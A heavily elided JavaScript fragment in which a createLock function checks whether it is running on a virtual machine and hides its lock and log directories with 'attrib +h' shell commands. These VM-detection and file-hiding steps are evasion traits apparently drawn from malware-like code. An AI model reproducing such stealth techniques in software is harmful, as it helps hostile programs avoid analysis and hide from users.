...
const { encryptData, decryptData, isRunningOnVirtualMachine, shuffleArray } = require('./controllers/utils.js');
...
async function createLock() {
    if (isRunningOnVirtualMachine() === true) {
...
└─────────────────────────────────────────────┘`);
    ...
    if (!fs.existsSync(lockDirectory)) {
        ...
        const hideDirectoryCommand = `attrib +h "${lockDirectory}"`;
        execSync(hideDirectoryCommand);
    }
...
└─────────────────────────────────────────────┘`);
        ...
        if (!fs.existsSync(logDirectory)) {
            ...
            const hideDirectoryCommand = `attrib +h "${logDirectory}"`;
            execSync(hideDirectoryCommand);
        }
